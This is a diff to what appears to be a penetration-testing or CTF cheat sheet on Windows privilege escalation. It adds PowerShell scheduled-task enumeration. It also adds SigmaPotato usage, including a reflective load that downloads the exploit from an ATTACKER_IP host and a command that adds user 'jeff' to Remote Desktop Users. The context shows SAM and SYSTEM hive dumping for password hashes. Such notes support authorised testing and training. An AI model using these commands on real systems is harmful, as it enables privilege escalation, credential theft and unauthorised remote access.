@@ -14,6 +14,14 @@ List scheduled tasks
 schtasks /query /fo LIST /v
 ```
 
+Powershell
+```powershell
+Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' }
+```
+```powershell
+Get-ScheduledTask | Where-Object { $_.State -eq 'Ready' }
+```
+
 Check ACL for schtask action
 ```powershell
 icacls $path
@@ -70,6 +78,21 @@ wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPo
 hash dump bypass
 ```powershell
 .\SigmaPotato.exe "cmd /c reg save HKLM\SAM C:\temp\SAM && reg save HKLM\SYSTEM C:\temp\SYSTEM"
+```
+
+system reflection (remote load)
+```powershell
+[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
+```
+
+or file load
+```powershell
+[System.Reflection.Assembly]::LoadFile("$PWD\sigpo.exe")
+```
+
+use reflection
+```powershell
+[SigmaPotato]::Main('cmd /c net localgroup "Remote Desktop Users" jeff /add')
 ```
 
 Secrets dump for hashes
